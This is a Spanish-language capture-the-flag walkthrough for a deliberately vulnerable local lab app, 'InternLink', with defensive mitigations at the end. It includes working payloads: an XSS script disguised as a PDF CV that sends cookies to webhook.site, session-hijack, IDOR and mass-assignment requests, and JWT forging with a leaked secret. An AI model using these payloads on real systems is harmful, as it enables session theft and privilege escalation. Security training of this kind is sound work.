# 🚩 InternLink CTF - Walkthrough Completo

Este documento contiene la solución paso a paso de todos los actos del laboratorio.

## 🎯 Objetivo General

Escalar desde un usuario estudiante normal hasta administrador del sistema, capturando 9 flags en el proceso.

---

## 📝 Preparación

1. **Inicia la aplicación:**
```bash
python app.py
```

2. **Abre tu navegador en:** `http://localhost:5000`

3. **Prepara herramientas:**
   - DevTools del navegador (F12)
   - Editor de texto
   - [jwt.io](https://jwt.io) (opcional)
   - [webhook.site](https://webhook.site) (para XSS)

---

## 🎬 ACTO 1: Enumeración de Usuarios

### Objetivo
Descubrir usuarios existentes mediante respuestas diferenciadas del servidor.

### Pasos

1. Ve a la página de registro: `http://localhost:5000/register`

2. Abre DevTools (F12) y ve a la pestaña Network

3. En el campo de email, prueba estos valores:
   - `test@test.com` → Verás "Email disponible"
   - `admin@internlink.com` → Verás "Este email ya está registrado"

4. Observa las respuestas en Network o en el texto debajo del input

5. En la consola del navegador verás:
```
🚩 FLAG encontrado: FLAG{user_enumeration_is_real}
```

### ✅ Flag Capturado
```
FLAG{user_enumeration_is_real}
```

### Usuarios existentes descubiertos:
- `empresa@techcorp.com` (password: `EmpresaPass123!`)
- `coordinador@internlink.com` (password: `CoordPass123!`)
- `admin@internlink.com` (password: `AdminPass123!`)

---

## 🎬 ACTO 2: Stored XSS vía Upload de CV

### Objetivo
Inyectar JavaScript malicioso mediante un archivo HTML disfrazado de PDF.

### Pasos

1. **Regístrate como estudiante:**
   - Email: `estudiante1@test.com`
   - Password: `Password123!`
   - Role: Estudiante

2. **Crea el archivo malicioso:**

Crea un archivo llamado `cv_malicioso.html` con este contenido:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Curriculum Vitae - Juan Pérez</title>
</head>
<body>
    <h1>Curriculum Vitae</h1>
    <h2>Juan Pérez Estudiante</h2>
    <p><strong>Email:</strong> juan@ejemplo.com</p>
    <p><strong>Teléfono:</strong> +57 300 123 4567</p>
    
    <h3>Experiencia</h3>
    <ul>
        <li>Desarrollador Jr. - TechCompany (2022-2023)</li>
        <li>Practicante - StartupXYZ (2021-2022)</li>
    </ul>
    
    <script>
        // XSS Payload - Roba cookies y las envía
        console.log('🚩 XSS ejecutado!');
        console.log('Cookies capturadas:', document.cookie);
        
        // Simular envío a servidor del atacante
        // En un escenario real, usarías webhook.site o similar
        fetch('https://webhook.site/tu-id-unico', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                cookies: document.cookie,
                url: window.location.href,
                userAgent: navigator.userAgent
            })
        }).catch(e => console.log('Fetch bloqueado por CORS (normal en local)'));
        
        // Alternativa: mostrar en consola
        alert('XSS ejecutado! Check console for cookies');
    </script>
</body>
</html>
```

3. **Renombra el archivo:**
   - Windows: `ren cv_malicioso.html cv_malicioso.pdf`
   - Linux/Mac: `mv cv_malicioso.html cv_malicioso.pdf`

4. **Sube el archivo:**
   - Ve a tu dashboard de estudiante
   - En la sección "📄 Subir Currículum Vitae"
   - Selecciona `cv_malicioso.pdf`
   - Click en "Subir CV"

5. **Verifica la respuesta:**
```json
{
    "success": true,
    "message": "CV subido correctamente",
    "flag": "FLAG{stored_xss_persisted}"
}
```

### ✅ Flag Capturado
```
FLAG{stored_xss_persisted}
```

### Nota sobre cookies robadas
El JavaScript se ejecutará cuando el sistema "procese" el CV. En un escenario real:
- Una empresa abriría el CV
- El script robaría sus cookies de sesión
- Enviaría las cookies a tu servidor (webhook.site)

Para probar localmente, visita: `http://localhost:5000/view-cv/1_cv_malicioso.pdf`

---

## 🎬 ACTO 3: Session Hijacking

### Objetivo
Usar cookies robadas para acceder a cuentas de otros usuarios.

### Pasos

1. **Obtén la cookie de sesión de la empresa:**

En DevTools → Console, ejecuta:
```javascript
// Simular que ya obtuviste la cookie de una empresa
// En el ACTO 2 la habrías capturado vía XSS
console.log('Cookie actual:', document.cookie);
```

2. **Para este ejercicio, inicia sesión manualmente como empresa:**
   - Email: `empresa@techcorp.com`
   - Password: `EmpresaPass123!`

3. **Copia tu cookie de sesión:**

En DevTools → Application → Cookies → http://localhost:5000
Copia el valor de `session_token`

4. **Cierra sesión**

5. **Ahora "roba" la sesión:**

En la página de login, abre DevTools → Console y ejecuta:
```javascript
// Reemplaza con la cookie que copiaste
document.cookie = "session_token=TU_TOKEN_AQUI";
location.href = "/";
```

6. **Verás el dashboard de empresa con el flag:**

### ✅ Flag Capturado
```
FLAG{session_hijacked}
```

### Explicación
Las cookies sin `HttpOnly` pueden ser leídas por JavaScript, permitiendo que un XSS robe sesiones.

---

## 🎬 ACTO 4: IDOR Horizontal

### Objetivo
Acceder a datos de otras empresas sin autorización.

### Pasos

1. **Estando en el panel de empresa**, ve a la sección "👥 Ver Candidatos"

2. **Observa el campo "ID de Empresa a consultar"**
   - Por defecto muestra el ID de tu empresa (probablemente 1)

3. **Prueba con diferentes IDs:**
   - Ingresa: `2`
   - Click en "Cargar Candidatos"
   - Verás candidatos de la empresa 2 (¡sin ser dueño!)

4. **Prueba más IDs:** 3, 4, 5, etc.

5. **Captura el flag en la respuesta:**

### ✅ Flag Capturado
```
FLAG{idor_horizontal}
```

### También puedes hacerlo vía curl/fetch:

```javascript
fetch('/api/company/candidates?company_id=999')
    .then(r => r.json())
    .then(data => console.log(data));
```

### Explicación
El endpoint no valida que el `company_id` pertenezca al usuario autenticado.

---

## 🎬 ACTO 5: Mass Assignment

### Objetivo
Escalar privilegios modificando el campo `role` en el perfil.

### Pasos

1. **Inicia sesión como estudiante:**
   - Usa el estudiante que creaste antes
   - O crea uno nuevo

2. **Verifica tu rol actual:**
   - En el dashboard verás: "Role: student"

3. **Abre DevTools → Console**

4. **Ejecuta este código para cambiar tu rol a coordinador:**

```javascript
fetch('/api/profile/update', {
    method: 'PUT',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        name: 'Estudiante Malicioso',
        role: 'coordinator'  // ¡Escalando privilegios!
    })
})
.then(r => r.json())
.then(data => {
    console.log('Respuesta:', data);
    if(data.flag) {
        console.log('🚩 FLAG:', data.flag);
    }
    // Recargar para ver cambios
    setTimeout(() => location.reload(), 2000);
});
```

5. **Verás la respuesta:**
```json
{
    "success": true,
    "message": "Perfil actualizado",
    "flag": "FLAG{mass_assignment_abuse}"
}
```

6. **La página se recargará automáticamente**
   - Ahora verás "Coordinador" en tu badge
   - Tendrás acceso a nuevas funcionalidades

### ✅ Flag Capturado
```
FLAG{mass_assignment_abuse}
```

### Escalar a Admin (opcional)
Repite el proceso cambiando:
```javascript
role: 'admin'
```

### Explicación
El backend acepta cualquier campo en el JSON sin validar, permitiendo modificar campos sensibles como `role`.

---

## 🎬 ACTO 6: Análisis de Archivo Binario

### Objetivo
Extraer información oculta de un archivo Excel sin extensión.

### Pasos

1. **Asegúrate de tener rol de coordinador** (del ACTO 5)

2. **Ve a tu Dashboard de Coordinador**

3. **En la sección "📊 Exportar Candidatos":**
   - Click en "Descargar Archivo"
   - Se abrirá una nueva pestaña con contenido binario ilegible

4. **Guarda el archivo:**
   - Ctrl+S (o Cmd+S en Mac)
   - Guárdalo como `candidates` (sin extensión)

5. **Identifica el tipo de archivo:**

**En Windows PowerShell:**
```powershell
# El contenido empieza con PK (ZIP/Office file)
Get-Content candidates -TotalCount 2
```

**En Linux/Mac:**
```bash
file candidates
# Output: candidates: Microsoft Excel 2007+
```

6. **Renombra el archivo:**

**Windows:**
```powershell
ren candidates candidates.xlsx
```

**Linux/Mac:**
```bash
mv candidates candidates.xlsx
```

7. **Abre en Excel/LibreOffice:**
   - Verás una hoja "Candidatos" con datos normales
   - **¡Busca hojas ocultas!**

8. **Encuentra la hoja "Config":**
   - En Excel: Click derecho en las pestañas → Mostrar
   - O simplemente busca la pestaña "Config"

9. **Información encontrada:**
```
JWT_SECRET: internlink2024
Admin Endpoint: /admin/panel
FLAG: FLAG{binary_files_hide_secrets}
```

### ✅ Flag Capturado
```
FLAG{binary_files_hide_secrets}
```

### ✅ Información Crítica Obtenida
```
JWT_SECRET = internlink2024
```
(Necesario para el ACTO 7)

---

## 🎬 ACTO 7: JWT Forgery

### Objetivo
Crear un token JWT falso con rol de admin usando el secret débil.

### Pasos

1. **Con el JWT_SECRET descubierto:** `internlink2024`

2. **Opción A: Usar jwt.io**

   - Ve a [https://jwt.io](https://jwt.io)
   - En "Decoded" → "PAYLOAD", ingresa:
   ```json
   {
     "user_id": "999",
     "email": "hacker@test.com",
     "role": "admin"
   }
   ```
   - En "Verify Signature", ingresa: `internlink2024`
   - Copia el token generado (sección "Encoded")

3. **Opción B: Usar Python**

```python
import jwt

payload = {
    'user_id': '999',
    'email': 'hacker@test.com',
    'role': 'admin'
}

token = jwt.encode(payload, 'internlink2024', algorithm='HS256')
print(token)
```

4. **Verifica el token en la aplicación:**

   - Ve al Dashboard de Coordinador
   - En la sección "🔐 Acceso Avanzado"
   - Pega tu token generado
   - Click en "Verificar Token"

5. **Verás la respuesta:**
```json
{
    "valid": true,
    "user": {
        "user_id": "999",
        "email": "hacker@test.com",
        "role": "admin"
    },
    "flag": "FLAG{jwt_forged_successfully}"
}
```

### ✅ Flag Capturado
```
FLAG{jwt_forged_successfully}
```

### Explicación
El sistema usa un secret débil y hardcodeado para firmar JWTs, permitiendo que un atacante cree tokens arbitrarios.

---

## 🎬 ACTO 8: Logs Expuestos

### Objetivo
Encontrar información sensible en logs accesibles públicamente.

### Pasos

1. **Visita directamente el endpoint de logs:**
```
http://localhost:5000/logs/debug.log
```

2. **No requiere autenticación** (¡vulnerabilidad!)

3. **Encontrarás información como:**
```
[2024-02-15 10:23:45] INFO: Sistema iniciado
[2024-02-15 10:24:12] DEBUG: Conexión Redis establecida
[2024-02-15 10:24:15] WARNING: Intento de login fallido para admin@internlink.com
[2024-02-15 10:24:30] INFO: Login exitoso: admin@internlink.com
[2024-02-15 10:25:00] DEBUG: JWT_SECRET=internlink2024
[2024-02-15 10:25:15] ERROR: Stack trace:
  File "app.py", line 245, in process_payment
    db.execute(f"UPDATE salaries SET amount={amount}")
[2024-02-15 10:26:00] DEBUG: Credencial temporal: temp_admin_pass_2024!
[2024-02-15 10:27:00] INFO: FLAG{logs_are_sensitive}
[2024-02-15 10:28:00] DEBUG: Redis URL: https://proven-bonefish-57929.upstash.io
```

### ✅ Flag Capturado
```
FLAG{logs_are_sensitive}
```

### Información Sensible Expuesta:
- JWT Secret
- Credenciales temporales
- Stack traces con código
- URLs de bases de datos
- Intentos de login

### Explicación
Los logs están accesibles sin autenticación y contienen información que debería ser privada.

---

## 🎬 ACTO FINAL: Acceso Total como Admin

### Objetivo
Usar privilegios de admin para manipular el sistema.

### Pasos

1. **Asegúrate de tener rol 'admin':**
   - Vía Mass Assignment (ACTO 5): cambiar role a 'admin'
   - O usando JWT forjado (ACTO 7)

2. **Visita el panel de admin:**
```
http://localhost:5000/dashboard/admin
```

3. **Verás el mensaje de felicitaciones y el flag final**

4. **Prueba las funcionalidades de admin:**

**Modificar Salarios:**
```javascript
fetch('/api/admin/update-salary', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        student_id: '1',
        salary: '999999999'
    })
})
.then(r => r.json())
.then(data => console.log(data));
```

**Aprobar/Rechazar Ofertas:**
```javascript
fetch('/api/admin/approve-offer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        offer_id: '1',
        status: 'approved'
    })
})
.then(r => r.json())
.then(data => console.log(data));
```

### ✅ Flag Final Capturado
```
FLAG{internlink_compromised}
```

### 🎉 ¡Laboratorio Completado!

Has capturado todos los 9 flags y comprometido completamente el sistema.

---

## 📊 Resumen de Flags

1. ✅ `FLAG{user_enumeration_is_real}`
2. ✅ `FLAG{stored_xss_persisted}`
3. ✅ `FLAG{session_hijacked}`
4. ✅ `FLAG{idor_horizontal}`
5. ✅ `FLAG{mass_assignment_abuse}`
6. ✅ `FLAG{binary_files_hide_secrets}`
7. ✅ `FLAG{jwt_forged_successfully}`
8. ✅ `FLAG{logs_are_sensitive}`
9. ✅ `FLAG{internlink_compromised}`

---

## 🛡️ Mitigaciones Recomendadas

### ACTO 1: Enumeración
- Usar respuestas genéricas ("Revise su email")
- Implementar rate limiting
- Agregar CAPTCHA

### ACTO 2: Stored XSS
- Validar MIME type real (no solo extensión)
- Sanitizar contenido
- Content Security Policy (CSP)
- Conversión a imagen del PDF

### ACTO 3: Session Hijacking
- Cookie con flag `HttpOnly`
- Cookie con flag `Secure` (HTTPS)
- Cookie con `SameSite`
- Regenerar session ID en login

### ACTO 4: IDOR
- Validar ownership del recurso
- Verificar autorización en cada request
- Usar UUIDs en lugar de IDs incrementales

### ACTO 5: Mass Assignment
- Whitelist de campos permitidos
- Usar DTOs/Schemas de validación
- No confiar en input del cliente

### ACTO 6: Información en Archivos
- No incluir información sensible en exports
- Encriptar datos sensibles
- Control de acceso estricto

### ACTO 7: JWT Débil
- Usar secrets largos y aleatorios
- Rotar secrets periódicamente
- Validar algoritmo correctamente
- Usar RS256 en lugar de HS256

### ACTO 8: Logs Expuestos
- Logs solo accesibles desde servidor
- No loggear información sensible
- Implementar autenticación para logs
- Usar log management apropiado

### ACTO FINAL: Controles de Admin
- Multi-factor authentication (MFA)
- Auditoría completa de acciones
- Confirmación para acciones críticas
- Separación de privilegios

---

## 🎓 Lecciones Aprendidas

1. **Nunca confíes en el input del usuario**
2. **Valida en el backend, siempre**
3. **Implementa el principio de menor privilegio**
4. **No expongas información sensible**
5. **Usa secrets fuertes y aleatorios**
6. **Implementa logging y auditoría**
7. **Mantén las cookies seguras**
8. **Valida autorización en cada endpoint**
9. **No confíes en extensiones de archivo**
10. **Security through obscurity NO funciona**

---

¡Felicidades por completar el laboratorio! 🎉

Ahora tienes experiencia práctica con vulnerabilidades web comunes y cómo explotarlas éticamente.
